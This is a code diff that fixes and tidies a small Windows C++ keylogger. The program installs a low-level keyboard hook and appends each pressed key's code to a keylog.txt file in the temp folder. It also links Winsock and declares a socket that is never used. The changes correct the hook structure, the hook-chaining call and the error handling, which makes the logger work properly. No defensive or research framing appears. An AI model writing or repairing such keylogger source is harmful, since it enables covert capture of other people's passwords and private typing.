@@ -1,87 +1,78 @@
 #include <stdio.h>
+#include <winsock2.h>
 #include <windows.h>
 #include <string>
-#include <winsock2.h>
 using namespace std;
 
-
 #pragma comment(lib, "ws2_32.lib")
+
+// Forward declarations
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 string getTempPath();
-string createPath(string temp_path);
+string createPath(const string& temp_path);
 
-
+// Global variables
 WSADATA wsaData;
 SOCKET ConnectSocket = INVALID_SOCKET;
+HHOOK keyboardHook = NULL;
 
-int main (){
-
-    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-
+int main() {
+    // Install the keyboard hook
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    
+    if (keyboardHook == NULL) {
+        
+        return 1;
+    }
+    
+    
+    // Message loop
     MSG message;
-
-    while (1){
-
-        if(GetMessage(&message , NULL, 0, 0)){
-
-            TranslateMessage(&message);
-
-            DispatchMessage(&message);
-
-
-        } else {
-
-            break;
-
-        }
-
+    while (GetMessage(&message, NULL, 0, 0)) {
+        TranslateMessage(&message);
+        DispatchMessage(&message);
     }
-
+    
+    // Cleanup
+    UnhookWindowsHookEx(keyboardHook);
+    return 0;
 }
 
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
-
-    string temp = getTempPath();
-
-    string filepath = createPath(temp);
-
-
-    if (nCode >=0){
-
-        if(wParam ==WM_KEYDOWN){
-
-            KBDHOOKSTRUCT* kb = (KBDHOOKSTRUCT*)lParam;
-
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        if (wParam == WM_KEYDOWN) {
+            
+            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
             DWORD key_code = kb->vkCode;
-
+            
+            
+            string temp = getTempPath();
+            string filepath = createPath(temp);
+            
+           
             FILE* file = fopen(filepath.c_str(), "a");
-
-            fprintf(file, "%d", key_code);
-
-            fclose(file);
+            if (file != NULL) {
+               
+                fprintf(file, "%d ", key_code);
+                fclose(file);
+            }
         }
-
     }
-
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
-
+    
+    // CORRECTED: Pass the actual hook handle
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
-string getTempPath(){
-
+string getTempPath() {
     char temp_path[MAX_PATH];
-
+    
     GetTempPathA(MAX_PATH, temp_path);
-
-    return temp_path;
-
+    return string(temp_path);
 }
 
-string createPath(const string& temp_path){
-
-    string FinalFile = temp_path + "\\keylog.txt";
-
+string createPath(const string& temp_path) {
+    
+    string FinalFile = temp_path + "keylog.txt";
     return FinalFile;
-
 }
 
